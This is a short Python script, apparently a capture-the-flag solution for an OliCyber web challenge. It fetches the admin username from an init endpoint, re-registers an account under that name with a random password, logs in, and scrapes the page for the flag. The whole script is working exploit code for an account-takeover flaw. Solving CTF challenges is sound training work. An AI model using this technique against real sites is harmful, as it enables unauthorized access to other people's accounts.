from bs4 import BeautifulSoup
import requests
import random
import string

def generate_random_password(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

base_url = "http://zio-frank.challs.olicyber.it"
init_url = f"{base_url}/admin/init"
register_url = f"{base_url}/register"
login_url = f"{base_url}/login"

print("Inizializzazione del server...")
init_response = requests.post(init_url)
if init_response.status_code != 200:
    print("Errore nell'inizializzazione del server.")
    print(init_response.text)
    exit()

try:
    username = init_response.json().get("username")
    if not username:
        raise ValueError("Campo 'username' non trovato nella risposta JSON.")
except ValueError as e:
    print(f"Errore durante il parsing dello username: {e}")
    print(init_response.text)
    exit()

print(f"Username ricevuto: {username}")

password = generate_random_password()
print(f"Password generata: {password}")

register_data = {
    "username": username,
    "password": password,
    "password2": password
}

print("Registrazione dell'account...")
register_response = requests.post(register_url, data=register_data)
if register_response.status_code != 200:
    print("Errore durante la registrazione.")
    print(register_response.text)
    exit()

print("Registrazione completata.")

login_data = {
    "username": username,
    "password": password
}

print("Effettuando il login...")
login_response = requests.post(login_url, data=login_data)
if login_response.status_code != 200:
    print("Errore durante il login.")
    print(login_response.text)
    exit()

print("Analizzando la risposta...")
soup = BeautifulSoup(login_response.text, 'html.parser')

lines_with_flag = [str(tag) for tag in soup.find_all(string=lambda t: 'flag' in t.lower())]

if lines_with_flag:
    print("Righe trovate che contengono 'flag':")
    for line in lines_with_flag:
        print(line)
else:
    print("Nessuna riga trovata che contenga 'flag'.")
